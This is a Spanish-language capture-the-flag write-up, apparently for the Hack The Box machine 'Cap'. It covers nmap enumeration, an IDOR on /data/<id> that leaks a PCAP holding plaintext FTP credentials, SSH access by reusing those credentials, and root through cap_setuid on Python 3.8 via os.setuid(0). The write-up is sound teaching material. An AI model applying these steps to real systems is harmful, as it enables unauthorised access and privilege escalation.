Aplicación web "Security Dashboard" que expone una vulnerabilidad IDOR sobre los IDs de las capturas de paquetes, filtrando credenciales FTP en texto plano desde un PCAP descargable. Escalada de privilegios mediante la capability cap_setuid en el intérprete de Python 3.8, que concede acceso directo a root.

## Reconocimiento y enumeración

El objetivo de esta fase era identificar la superficie de ataque expuesta por el objetivo y detectar cualquier cosa que insinuara un punto de entrada.

### Descubrimiento del host

Antes de lanzar ningún escaneo, confirmé que el host era accesible y obtuve una primera pista sobre el sistema operativo a partir del valor del TTL:

```bash
ping 10.129.25.130

64 bytes from 10.129.25.130: icmp_seq=1 ttl=63 time=49.6 ms
```

Un TTL de 63 indica un host Linux (por defecto 64, decrementado una vez por el salto de enrutamiento). Con el host vivo, pasé a un barrido completo de puertos TCP.

### Escaneo de puertos

Para enumerar rápidamente cada puerto TCP abierto, lancé un escaneo SYN sobre todo el rango de 65535 con una alta velocidad de paquetes. Usé `-Pn` para saltar el descubrimiento de host, ya que ICMP confirmó que el host está vivo:

```bash
sudo nmap -p- --min-rate 5000 -sS -vvv -Pn -n 10.129.25.130 -oG allPorts

PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Tres servicios expuestos: FTP, SSH y HTTP. Se lanzó un escaneo dirigido con los scripts por defecto y detección de versiones contra esos tres puertos para reunir más detalle:

```bash
sudo nmap -p21,22,80 -sCV 10.129.25.130 -oN nmap

21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn
|_http-title: Security Dashboard
```

Dos hallazgos destacaban:

- **vsftpd 3.0.3** en FTP — valía la pena comprobar el acceso anónimo, pero el conocido backdoor de `vsftpd 2.3.4` no aplica a esta versión.
- **Gunicorn** en HTTP sirviendo una página titulada *Security Dashboard* — Gunicorn es un servidor HTTP WSGI de Python, lo que sugiere una aplicación Flask/Django a medida en lugar de un CMS de fábrica. Las aplicaciones a medida son típicamente donde viven los fallos de lógica, así que el servicio web pasó a ser la prioridad.

### Aplicación web

Navegar a `http://10.129.25.130/` cargó el *Security Dashboard* logueado como el usuario **Nathan**, con varias entradas en la barra lateral: *Security Snapshot (5 Second PCAP + Analysis)*, *Network Status* y una vista *Dashboard*. La función Security Snapshot captura tráfico de red en vivo durante 5 segundos, ejecuta un análisis rápido (conteos de paquetes, desglose IP/TCP/UDP) y ofrece una descarga del PCAP.

Tras disparar una nueva captura, la aplicación redirigió a `/data/1`:

![/assets/img/HTB/Cap/page1.png](/assets/img/HTB/Cap/page1.png)


La página renderizó un snapshot vacío (0 paquetes en todos los contadores). La propia URL era la parte interesante: `/data/1` parecía un identificador numérico secuencial que referenciaba un snapshot concreto. Si la aplicación no aplicaba la propiedad sobre ese recurso, decrementar el ID podría exponer la captura de otra persona — un **IDOR (Insecure Direct Object Reference)** de manual.

Manipulé la URL directamente, reemplazando el ID por `0`:

```text
http://10.129.25.130/data/0
```

![/assets/img/HTB/Cap/page2.png](/assets/img/HTB/Cap/page2.png)

La respuesta devolvió un snapshot con datos: 72 paquetes, 69 de ellos TCP. La aplicación no tenía ninguna comprobación de autorización sobre el ID del snapshot, confirmando el IDOR y dando acceso a una captura que no pertenecía a la sesión actual. Pulsé **Download** para recuperar el PCAP para análisis offline.

## Explotación

La vulnerabilidad que impulsa el acceso inicial es el IDOR identificado arriba: recorriendo el parámetro `/data/<id>`, un usuario no autenticado (bueno, de bajos privilegios) puede extraer PCAPs históricos arbitrarios, incluidos los generados durante operaciones privilegiadas. Los PCAPs contienen frecuentemente credenciales en texto plano cuando hay protocolos en claro de por medio, así que el siguiente paso natural era inspeccionar qué protocolos había registrado esta captura.

Abrí el archivo descargado en Wireshark y apliqué el filtro de visualización `ftp` para aislar cualquier intercambio FTP en claro:

![/assets/img/HTB/Cap/wireshark.png](/assets/img/HTB/Cap/wireshark.png)

La captura había registrado un login FTP desde `192.168.196.1` a `192.168.196.16`:

```text
36  Request:  USER nathan
40  Request:  PASS Buck3tH4TF0RM3!
42  Response: 230 Login successful.
```

FTP transmite las credenciales en texto plano, así que el nombre de usuario y la contraseña eran trivialmente legibles. La credencial `nathan:Buck3tH4TF0RM3!` casi con seguridad estaba reutilizada para SSH, dado que Nathan es también el usuario logueado en el dashboard.

Probé la reutilización contra el servicio SSH:

```bash
ssh nathan@10.129.25.130

Welcome to Ubuntu 20.04.2 LTS
nathan@cap:~$
```


Se devolvió una shell como `nathan`. La flag de usuario era legible directamente desde el directorio home:

```bash
cat user.txt
```

## Escalada de privilegios

Con una shell como `nathan`, el objetivo era escalar a root. Las comprobaciones rápidas habituales volvieron vacías:

- `sudo -l` — `nathan` no tenía privilegios sudo.
- Búsqueda de binarios SUID — nada inusual.

La siguiente comprobación estándar son las **capabilities de Linux**, una alternativa de grano fino al bit SUID que permite a un binario tener privilegios específicos del kernel sin ser completamente setuid root. `getcap -r /` lista cada binario con capabilities del sistema:

```bash
getcap / -r 2>/dev/null

/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

La entrada destacada era `/usr/bin/python3.8` portando **`cap_setuid+eip`**. Esta capability concede al binario la capacidad de llamar a `setuid()` y cambiar su UID efectivo a cualquier valor — incluido el UID 0 (root) — sin necesidad del bit SUID. Como la capability está en el propio intérprete de Python, cualquier código Python ejecutado por ese binario hereda el privilegio, lo que hace la explotación trivial: invocar `os.setuid(0)` desde una sesión interactiva y luego lanzar una shell.

```bash
python3

import os
os.setuid(0)
os.system("/bin/bash")
```

```text
root@cap:~#
```

La shell heredó el UID 0 y la flag de root era legible:

```bash
cat /root/root.txt
```
